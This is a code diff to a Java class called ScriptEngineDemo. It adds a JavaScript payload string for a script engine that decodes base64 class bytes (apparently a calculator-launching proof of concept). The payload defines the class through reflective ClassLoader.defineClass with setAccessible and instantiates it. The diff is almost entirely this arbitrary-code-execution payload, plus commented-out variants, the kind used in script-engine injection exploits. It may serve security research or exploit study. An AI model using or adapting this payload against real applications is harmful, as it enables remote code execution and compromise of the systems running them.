@@ -30,6 +30,16 @@ public class ScriptEngineDemo {
                 "defineClassMethod.setAccessible(true);" +
                 "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
                 "loadedClass.newInstance();";
+        code = "var data=\"" + calcBase64 + "\";\n" +
+                "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
+                "var object = aClass.newInstance();\n" +
+                "var bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
+                "var classLoader=new java.lang.ClassLoader() {};\n" +
+                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                "defineClassMethod.setAccessible(true);\n" +
+                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
+                "loadedClass.newInstance();";
+        System.out.println(code);
 
 //        String code = "var data=\"" + calcBase64 + "\";var bytes=java.util.Base64.getDecoder().decode(data);" +
 //                "var classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
